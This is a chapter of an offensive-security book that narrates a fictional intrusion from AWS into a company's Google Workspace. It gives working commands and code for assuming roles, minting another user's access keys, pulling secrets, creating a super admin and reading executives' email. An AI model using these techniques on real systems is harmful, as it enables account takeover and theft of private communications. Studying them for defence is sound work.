<html><head></head><body>
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="225" id="Page_225"/>13</span><br/>
<span class="ChapterTitle">Final Cut</span></h1>
</header>
<figure class="opener">
<img src="image_fi/book_art/chapterart.png" alt=""/>
</figure>
<p class="ChapterIntro">Recapping our achievements so far, we have managed to retrieve political ads running on MXR Ads servers, complete with budget data, creatives, and the real organizations behind them. Also, we downloaded profiling data of hundreds of millions of individuals harvested by GP, with each profile reading like a personal diary that could be used to incriminate, blackmail, or subdue even the most powerful people. What more could we want?</p>
<p>Well, there is one thing missing from this list of awards: company emails. Hacking emails is just such a classic that I could not close this book without talking about it.</p>
<p>When we acquire domain admin credentials in a Windows Active Directory, unlimited access to emails naturally follows. The infrastructure and the corporate directory are bound together in the Windows environment.</p>
<p><span epub:type="pagebreak" title="226" id="Page_226"/>Things are different with AWS. It never intended to conquer the corporate IT market. That venue is already crowded with the likes of Active Directory and Google Workspace (formerly G Suite).</p>
<p>Most tech companies that exclusively rely on AWS or Google Cloud Platform (GCP) to build and host their business products will turn to Google Workspace for their corporate directory. You can hate Google all you want, but Gmail is still the most comprehensive email platform. (For managing emails, that is. The blow to privacy may not be worth it, but that’s another debate.)</p>
<p>Oftentimes this leads to two separate IT teams: one in charge of the infrastructure delivering the core technical product and another handling the corporate side of IT (emails, printers, workstations, help desk, and so on).</p>
<p>A quick lookup of the DNS Mail Exchange (MX) records reveals that GP is indeed using corporate Gmail, and therefore probably other tools in Google Workspace, like Drive, Contacts, Hangouts, and the rest (see <a href="#listing13-1" id="listinganchor13-1">Listing 13-1</a>).</p>
<pre><code>root@Point1:~/# <b>dig +short gretschpolitico.com MX</b>
10 aspmx.l.google.com.
20 alt2.aspmx.l.google.com.
30 aspmx3.googlemail.com.
20 alt1.aspmx.l.google.com.
30 aspmx2.googlemail.com.</code></pre>
<p class="CodeListingCaption"><a id="listing13-1">Listing 13-1</a>: Lookup of MX records confirming that GP is indeed using Google Workspace</p>
<p>There is not much in the way of literature or scripts for exploiting and abusing Google Workspace, so let’s give it a go ourselves.</p>
<h2 id="h1-501263c13-0001">Hacking Google Workspace</h2>
<p class="BodyFirst">We are admin of GP’s AWS account and have unlimited access to all of its production resources, including the servers, users, GitHub account, and so on. Two strategies immediately come to mind for jumping over to the Google Workspace environment:</p>
<ul>
<li>Find a corporate intranet application and replace the home page with a fake Google authentication page that steals credentials before redirecting users to the real app.</li>
<li>Scour the codebase for applications that might interact with the Google Workspace environment and steal their credentials to establish a first foothold.</li>
</ul>
<p>The first option is a guaranteed winner, provided we do a good job of mimicking that Google authentication page. It’s also much riskier since it involves user interaction. Then again, we already have what we came for, so the heavens could fall down for all we care. This is just a bonus.</p>
<p><span epub:type="pagebreak" title="227" id="Page_227"/>The second option, on the other hand, is way stealthier, but it assumes that the IT department shares some ties with the rest of the infrastructure that we can leverage, like a Lambda function, an IAM role, an S3 bucket, a user—basically a needle in a scattered haystack . . . or is it?</p>
<p>Come to think of it, there is actually something that has a high probability of being shared between the IT department and the infrastructure team: the GitHub account. Surely they did not register two accounts just to please the two tech teams, did they?</p>
<p>Let’s load the GitHub token we retrieved from Jenkins and look for references to Google Workspace, Gmail, Google Drive, and so on. We write a brief Python script to load repository names:</p>
<pre><code># list_repos.py
from github import Github
g = Github("8e24ffcc0eeddee673ffa0ce5433ffcee7ace561")
for repo in g.get_user().get_repos():
    print(repo.name, repo.clone_url)

root@Point1:~/# <b>python3 list_repos.py &gt; list_repos_gp.txt</b>
root@Point1:~/# <b>egrep -i "it[-_]|gapps|gsuite|users?" list_repos_gp.txt</b>

it-service     https://github.com/gretschp/it-service.git
<span class="CodeAnnotationHang" aria-label="annotation1">1</span> it-gsuite-apps https://github.com/gretschp/it-gsuite-apps.git
users-sync     https://github.com/gretschp/users-sync
<var>--snip--</var></code></pre>
<p>A clear indication of cross-pollination <span class="CodeAnnotation" aria-label="annotation1">1</span>. We clone the source code of it-gsuite-apps and . . . what do you know?! It’s a list of applications and services used to automate many Google Workspace admin actions, like user provisioning, organizational unit (OU) assignments, terminating accounts, and so on:</p>
<pre><code>root@Point1:~/# <b>ls -lh it-gsuite-apps</b>

total 98M
drwxrwxrwx 1 root root   7.9M  provisionner
drwxrwxrwx 1 root root  13.4M  cron-tasks
drwxrwxrwx 1 root root   6.3M  assign-ou
<var>--snip--</var></code></pre>
<p>These are exactly the types of actions we need to use to achieve control over Google Workspace! Of course, this sensitive repo is not visible to regular users, but I guess impersonating Jenkins has its perks.</p>
<p>We start dreaming about pulling the CEO’s emails and exposing this fraudulent business, but we quickly realize that this repo does not contain a single cleartext password.</p>
<p>While AWS relies on access keys to authenticate users and roles, Google opted for the OAuth2 protocol, which requires explicit user interaction. Essentially, a web browser will open up, authenticate the user, and produce a validation code that must be pasted back into the command line to generate a temporary private key to call Google Workspace APIs.</p>
<p><span epub:type="pagebreak" title="228" id="Page_228"/>Machines cannot follow this authentication flow, so Google also provides service accounts that can authenticate using private keys. Yet, when looking at the source code, we do not find the slightest hint of private keys:</p>
<pre><code>root@Point1:~/it-gsuite-apps/# <b>grep -Ri "BEGIN PRIVATE KEY" *</b>
root@Point1:~/it-gsuite-apps/#</code></pre>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	The caveat is that service accounts can only be defined on Google Cloud Platform. So, in effect, to use Google Workspace properly, one needs to subscribe to GCP as well. Of course, this is mentioned nowhere in the docs, so you just magically land on the GCP platform from a Google Workspace window.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>So, we dive into the code of it-gsuite-apps to understand how the app acquires its Google Workspace privileges and stumble upon the lines shown in <a href="#listing13-2" id="listinganchor13-2">Listing 13-2</a>.</p>
<pre><code><var>--snip--</var>
getSecret(SERVICE_TOKEN);
<var>--snip--</var>
public static void getSecret(String token) {
  String secretName = token;
  String endpoint = "secretsmanager.eu-west-1.amazonaws.com";
  String region = "eu-west-1";

  AwsClientBuilder.EndpointConfiguration config = new AwsClientBuilder.EndpointConfiguration(endpoint, region);
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing13-2">Listing 13-2</a>: A code excerpt that loads a service token from AWS Secrets Manager</p>
<p>Now it makes sense. The secret is not hardcoded in the app but retrieved dynamically through Secrets Manager, an AWS service for centralizing and storing secrets. We don’t have the secret’s name, but lucky for us, we have full admin privileges, so we can easily search for it:</p>
<pre><code>root@Point1:~/# <b>aws secretsmanager list-secrets \</b>
<b>--region eu-west-1 \</b>
<b>--profile rundeck</b>

"Name": "inf/instance-api/api-token",
"Name": "inf/rundeck/mysql/test_user",
"Name": "inf/rundeck/cleanlog/apikey",
"Name": "inf/openvpn/vpn-employees",
<var>--snip--</var></code></pre>
<p>Unfortunately, no amount of grepping reveals anything remotely related to Google Workspace. We manually inspect every entry just in case, but the hard reality quietly dawns on us: the IT department must be using another AWS account. That’s the only rational explanation.</p>
<p>No need to panic, though. Hopping over to the IT AWS account will not require the same stunt we pulled when jumping from MXR Ads to GP. <span epub:type="pagebreak" title="229" id="Page_229"/>Those two companies are different (though intertwined) legal entities. They have completely separate AWS accounts. The IT department, however, is part of GP just as much as the regular tech team. It’s the same entity that pays the bills in the end.</p>
<p>The most probable configuration is that GP created an AWS organization, an entity that can house multiple AWS accounts: an account for the tech team, another for the IT department, another for testing, and so on. In such a configuration, one of the AWS accounts is promoted to the “master” status. This special account can be used to attach new accounts to the organization and apply global policies limiting the available set of services in each account.</p>
<p>The master account is usually devoid of any infrastructure and should—in an ideal world—delegate management tasks like log aggregation, billing reports, and such to other accounts. We can easily confirm our hypothesis by calling the <code>list-accounts</code> AWS API using our all-powerful rundeck role (see <a href="#listing13-3" id="listinganchor13-3">Listing 13-3</a>).</p>
<pre><code>root@Point1:~/# <b>aws organizations list-accounts</b>
"Accounts": [
   Id: 983457354409, Name: GP Infra, Email: infra-admin@gre...
   Id: 354899546107, Name: GP Lab, Email: gp-lab@gretschpoli...
 <span class="CodeAnnotation" aria-label="annotation1">1</span> Id: 345673068670, Name: GP IT, Email: admin-it@gretschpoli...
<var>--snip—</var></code></pre>
<p class="CodeListingCaption"><a id="listing13-3">Listing 13-3</a>: Listing the AWS accounts</p>
<p>Looking good. We can see the admin account, as expected <span class="CodeAnnotation" aria-label="annotation1">1</span>.</p>
<p>When creating a member account, AWS automatically provisions a default role called <em>OrganizationAccountAccessRole</em>. This role’s default trust policy allows impersonation from any user of the management account capable of issuing the Security Token Service (STS) <code>assume-role</code> API call. Let’s see if we can get its credentials:</p>
<pre><code>root@Point1:~/# <b>aws sts assume-role \</b>
<b>--role-session-name maintenance \</b>
<b>--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \</b>
<b>--profile rundeck</b>

An error occurred (AccessDenied) when calling the AssumeRole operation...</code></pre>
<p>Darn it, we were so close! If even Rundeck is not authorized to impersonate the OrganizationAccountAccessRole, it means that either the role was deleted or its trust policy has been restricted to a select few. If only there were a central system that logged every API request on AWS so we could look up these privileged users . . . hello, CloudTrail!</p>
<h3 id="h2-501263c13-0001">Abusing CloudTrail</h3>
<p class="BodyFirst">Every time a user or role assumes a role, that query is logged on CloudTrail and, in the case of GP, pushed to CloudWatch and S3. We can leverage this <span epub:type="pagebreak" title="230" id="Page_230"/>ever-watchful system to single out those users and roles allowed to hop over to the IT account. CloudTrail’s API does not provide many filtering capabilities, so we will instead use CloudWatch’s powerful <code>filter-log-events</code> command.</p>
<p>First, we get the name of the log group that aggregates CloudTrail logs:</p>
<pre><code>root@Point1:~/# <b>aws logs describe-log-groups \</b>
<b>--region=eu-west-1 \</b>
<b>--profile test</b>
--<var>snip</var>--
logGroupName: CloudTrail/DefaultLogGroup
<var>--snip--</var></code></pre>
<p>Then, as shown in <a href="#listing13-4" id="listinganchor13-4">Listing 13-4</a>, it’s simply a matter of searching for occurrences of the IT account identifier 345673068670, which we got from <a href="#listing13-3">Listing 13-3</a>.</p>
<pre><code>root@Point1<b>:~/# aws logs filter-log-events \</b>
<b>--log-group-name "CloudTrail/DefaultLogGroup" \</b>
<b>--filter-pattern "345673068670" \</b>
<b>--max-items 10 \</b>
<b>--profile rundeck \</b>
<b>--region eu-west-1 \</b>
<b>| jq ".events[].message" \</b>
<b>| sed 's/\\//g'</b>

"userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam:: 983457354409:user/elis.skyler",
    "accountId": "983457354409",
    "accessKeyId": "AKIA44ZRK6WS4G7MGL6W",
  <span class="CodeAnnotationHang" aria-label="annotation1">1</span>   "userName": "elis.skyler"
},
"requestParameters": {
     "roleArn": "arn:aws:iam::345673068670:role/OrganizationAccountAccessRole",
    "responseElements": {"credentials": {
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing13-4">Listing 13-4</a>: CloudTrail event showing <em>elis.skyler</em> impersonating a role inside the IT account</p>
<p>Looks like <em>elis.skyler</em> <span class="CodeAnnotation" aria-label="annotation1">1</span> impersonated the OrganizationAccountAccessRole a few hours ago. Time to grace this account with an additional access key that we can use to assume the foreign role ourselves. Of course, we are going to temporarily blind CloudTrail for this maneuver, but I will omit the code since you are familiar with that technique already from Chapter 11:</p>
<pre><code>root@Point1:~/# <b>aws iam create-access-key \</b>
<b>--user-name elis.skyler \</b>
<b>--profile rundeck</b>

<span epub:type="pagebreak" title="231" id="Page_231"/>AccessKey: {
    UserName: elis.skyler,
    AccessKeyId: AKIA44ZRK6WSRDLX7TDS,
    SecretAccessKey: 564//eyApoe96Dkv0DEdgAwroelak78eghk</code></pre>
<p>Using these new credentials, we request temporary AWS keys belonging to the OrganizationAccountAccessRole:</p>
<pre><code>root@Point1:~/# <b>aws sts assume-role \</b>
<b>--role-session-name maintenance \</b>
<b>--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \</b>
<b>--profile elis \</b>
<b>--duration-seconds 43 200</b>

AccessKeyId: ASIAU6EUDNIZIADAP6BQ,
SecretAccessKey: xn37rimJEAppjDicZZP19h0hLuT02P06SXZxeHbk,
SessionToken: FwoGZXIvYXdzEGwa...</code></pre>
<p>That was not so hard after all. Okay, let’s use these access credentials to look up the AWS Secrets Manager in this new account:</p>
<pre><code>root@Point1:~/# <b>aws secretsmanager list-secrets \</b>
<b>--region eu-west-1 \</b>
<b>--profile it-role</b>

ARN: arn:aws:secretsmanager:eu-west-1: 345673068670:secret:it/
gsuite-apps/user-provisionning-4OYxPA

Name: it/gsuite-apps/user-provisioning,
<var>--snip--</var></code></pre>
<p>Brilliant. We fetch the secret’s content and decode it to retrieve the JSON file used to authenticate Google service accounts (see <a href="#listing13-5" id="listinganchor13-5">Listing 13-5</a>).</p>
<pre><code>root@Point1:~/# <b>aws secretsmanager get-secret-value \</b>
<b>--secret-id 'arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/ \</b>
<b>gsuite-apps/user-provisionning-4OYxPA' \</b>
<b>--region=eu-west-1 \</b>
<b>--profile it-role \</b>
<b>| jq -r .SecretString | base64 -d</b>

{
    "type": "service_account",
    "project_id": "gp-gsuite-262115",
    "private_key_id": "05a85fd168856773743ed7ccf8828a522a00fc8f",
    "private_key": "-----BEGIN PRIVATE KEY-----... ",
    "client_email": "userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com",
    "client_id": "100598087991069411291",
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing13-5">Listing 13-5</a>: Retrieving the GCP service account key</p>
<p><span epub:type="pagebreak" title="232" id="Page_232"/>The service account is named <em>userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com</em> and is attached to the Google Cloud project gp-gsuite-262115. Not Google Workspace, mind you. Google Cloud. Since Google Workspace does not handle service tokens, anyone wanting to automate their Google Workspace administration must create a service token on Google Cloud and then assign scopes and permissions to that account on Google Workspace. It can’t get any messier than that!</p>
<p>We already know that this service token has the necessary permissions to create a user, so let’s help ourselves to a super admin account on Google Workspace.</p>
<h2 id="h1-501263c13-0002">Creating a Google Workspace Super Admin Account</h2>
<p class="BodyFirst">You can find the full Python code in the book’s GitHub repository as <em>create_user.py</em>, so I’ll just highlight the key points.</p>
<p>First, we need to declare the scope of the actions our account will perform on Google Workspace. Since we will create a new account, we need the scope <em>admin.directory.user</em>. We follow this bit with the location of the service token file and the email we will impersonate to carry out our actions:</p>
<pre><code>SCOPES =['https://www.googleapis.com/auth/admin.directory.user']
SERVICE_ACCOUNT_FILE = 'token.json'
USER_EMAIL = "admin-it@gretschpolitico.com"</code></pre>
<p>In Google’s security model, a service account cannot directly act on user accounts; it needs first to impersonate a real user using <em>domain-wide delegation</em> privileges, configured on the service account’s properties. Actions are then carried over with the privileges of the impersonated user, so we’d better find a super admin to impersonate.</p>
<p>No problem. We try putting in the email of the owner of the AWS GP IT account we found in <a href="#listing13-3">Listing 13-3</a> when enumerating existing AWS accounts: <em>admin-it@gretschpolitico.com</em>.</p>
<p>Next comes boilerplate Python code to build the Google Workspace client and impersonate the IT admin:</p>
<pre><code>credentials = (service_account.Credentials.
                from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES))

delegated_credentials = credentials.with_subject(USER_EMAIL)
service = discovery.build('admin', 'directory_v1', credentials=delegated_credentials)</code></pre>
<p>We build a dictionary with our desired user attributes (name, password, and so on), then execute the query:</p>
<pre><code>user = {"name": {"familyName": "Burton", "givenName": "Haniel",},
        "password": "Strong45Password*", "primaryEmail": "hanielle@gretschpolitico.com",
        "orgUnitPath": "/" }

result = service.users().insert(body=user).execute()</code></pre>
<p><span epub:type="pagebreak" title="233" id="Page_233"/>The final step is to make our user super admin over the entire organization:</p>
<pre><code>service.users().makeAdmin(userKey="hanielle@gretschpolitico.com",
                          body={"status": True}).execute()</code></pre>
<p>Now we just run the file:</p>
<pre><code>root@Point1:~/# <b>python create_user.py</b></code></pre>
<p>No errors. Did it really work? We open our browser and head to the Google Workspace Admin console, <a href="https://admin.google.com/" class="LinkURL">https://admin.google.com/</a>, as shown in <a href="#figure13-1" id="figureanchor13-1">Figure 13-1</a>.</p>
<figure>
<img src="image_fi/501263c13/f13001.png" alt="f13001"/>
<figcaption><p><a id="figure13-1">Figure 13-1</a>: Access to our newly created Google Workspace account</p></figcaption></figure>
<p>It bloody did! We have just achieved admin access to GP’s corporate directory. Nothing is beyond reach now: Gmails, Google Drive, you name it.</p>
<h2 id="h1-501263c13-0003">Sneaking a Peek</h2>
<p class="BodyFirst">To keep a low profile, we will avoid using the export features and data migration utilities of Google Workspace. Google automatically alerts other admins when anyone triggers these tasks. We will exclusively interact with Google Workspace the way we have so far: through API calls. We just need to upgrade the scope of the user-provisioning service account we grabbed from Secrets Manager to include Gmail and Google Drive access.</p>
<p>In the Google Workspace Admin console, we navigate to the <b>Security</b><span class="MenuArrow">▶</span><b>Advanced Settings</b><span class="MenuArrow">▶</span><b>Manage API Access</b> panel and enter the following two scopes in the <b>One or More API Scores</b> field, shown in <a href="#figure13-2" id="figureanchor13-2">Figure 13-2</a>:</p>
<ul>
<li><b>https://www.googleapis.com/auth/drive</b></li>
<li><b>https://www.googleapis.com/auth/gmail.readonly</b></li>
</ul>
<p>In the <b>Client Name</b> field, we write the service account’s name, <b>userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com</b>, which gets converted to a unique ID.</p>
<span epub:type="pagebreak" title="234" id="Page_234"/><figure>
<img src="image_fi/501263c13/f13002.png" alt="f13002"/>
<figcaption><p><a id="figure13-2">Figure 13-2</a>: Google Workspace admin panel to update API scopes</p></figcaption></figure>
<p>Contrary to the usual intuitive panels that Google is famous for, this admin panel is particularly dreadful. You cannot just append scopes, because they will overwrite old ones. You need to enter all the scopes assigned to a service account (old and new ones).</p>
<p>We create a new <em>gmail.py</em> Python script with the same boilerplate code previously used to create a user, except for a few alterations:</p>
<pre><code>USER_EMAIL = 'alexandra.styx@gretschpolitico.com'
service = discovery.build(<span class="CodeAnnotation" aria-label="annotation1">1</span>'gmail', 'v1', credentials=delegated_credentials)
<span class="CodeAnnotationHang" aria-label="annotation2">2</span> results = service.users().messages().list(
                    userId=USER_EMAIL,
                    labelIds = ['INBOX']).execute()

messages = results.get('messages', [])</code></pre>
<p>We update the scope to include Gmail <span class="CodeAnnotation" aria-label="annotation1">1</span> and then call the <code>users().messages()</code> API <span class="CodeAnnotation" aria-label="annotation2">2</span> to retrieve the CEO’s emails, whose name we gleefully take from LinkedIn.</p>
<p>Then it’s just a matter of looping through the messages, extracting the subject, sender, receiver, and email body. Check out the full code at <a href="https://github.com/HackLikeAPornstar/GreschPolitico" class="LinkURL">https://github.com/HackLikeAPornstar/GreschPolitico</a>. We run the full Python script and rifle through the emails at our leisure:</p>
<pre><code>root@Point1:~/# <b>python gmail.py</b>
alexandra.styx@gretschpolitico.com;
valery.attenbourough@gretschpolitico.com;
Sun, 15 Dec 2020;
Secured the party’s contract – $2M!

We just closed the contract today! We can start targeting PA undecided voters tomorrow!

---

alexandra.styx@gretschpolitico.com;
adam.sparrow@gretschpolitico.com;
Sun, 12 Dec 2020;
We need to go after his public image

Can't we make up a story? Send some girls, champagne and kickstart it
that way? We have the creatives ready, we need to get moving!!!</code></pre>
<p><span epub:type="pagebreak" title="235" id="Page_235"/>Gretsch Politico in all its glory, ladies and gentlemen! Time to dig out the dirt.</p>
<h2 id="h1-501263c13-0004">Closing Thoughts</h2>
<p class="BodyFirst">Wow, we made it to the end. That was an intense journey filled with many esoteric technologies and new paradigms. The generalization of cloud computing may be one of the most disrupting events of the last decade. And while many tech companies and startups are already fully embracing the cloud, I feel that the security community is still lagging behind.</p>
<p>Every post I read about lateral movement, C2 communication, and so forth exclusively covers Active Directory—as if it’s the only possible configuration and as if the most valuable data is necessarily stored on a Windows share or SQL server. That certainly is not true for banks and airlines (mainframes, anyone?). In fact, as we saw just in this scenario, more and more tech companies are moving away from Windows environments.</p>
<p>Maybe it’s a bias introduced by consulting companies only working with old firms that are still neck-deep in Active Directory. Maybe it’s the number of Windows CVEs (Common Vulnerabilities and Exposures) that flood the market. Probably a little bit of both.</p>
<p>In any case, I hope that the numerous examples in this book helped drive at least one message home: security is about thoroughly understanding a piece of technology, asking questions, and deconstructing the whole thing until it makes sense. The deeper you dig, the easier it is to toy with it afterward.</p>
<p>We wrote significant custom code to sneak past detection services or to simply circumvent tedious network restrictions. Download the codebase, play with it, try it out on a free tier AWS account, and extend it to new horizons. That’s the only proven road to success.</p>
<p>Happy hacking!</p>
<h2 id="h1-501263c13-0005">Resources</h2>
<ul>
<li>Matthew Toussain’s interesting article about Google Workspace (formerly G Suite) hacking at <a href="https://www.blackhillsinfosec.com/" class="LinkURL">https://www.blackhillsinfosec.com/</a>.</li>
<li>Google’s guide to using OAuth2 to access its APIs: <a href="http://bit.ly/2RAzYEx" class="LinkURL">http://bit.ly/2RAzYEx</a>.</li>
<li>The Google Workspace User Accounts guide: <a href="https://developers.google.com/admin-sdk/directory/v1/guides/manage-users/" class="LinkURL">https://developers.google.com/admin-sdk/directory/v1/guides/manage-users/</a>.</li>
<li>Instructions for performing Google Workspace domain-wide delegation: <a href="https://developers.google.com/admin-sdk/directory/v1/guides/delegation/" class="LinkURL">https://developers.google.com/admin-sdk/directory/v1/guides/delegation/</a>.</li>
<li>More on Google service accounts: <a href="https://cloud.google.com/compute/docs/access/service-accounts/" class="LinkURL">https://cloud.google.com/compute/docs/access/service-accounts/</a>.</li>
<li>More on AWS organizations and delegated admin members: <a href="https://amzn.to/3766cAL" class="LinkURL">https://amzn.to/3766cAL</a>.</li>
</ul>
</section>
</body></html>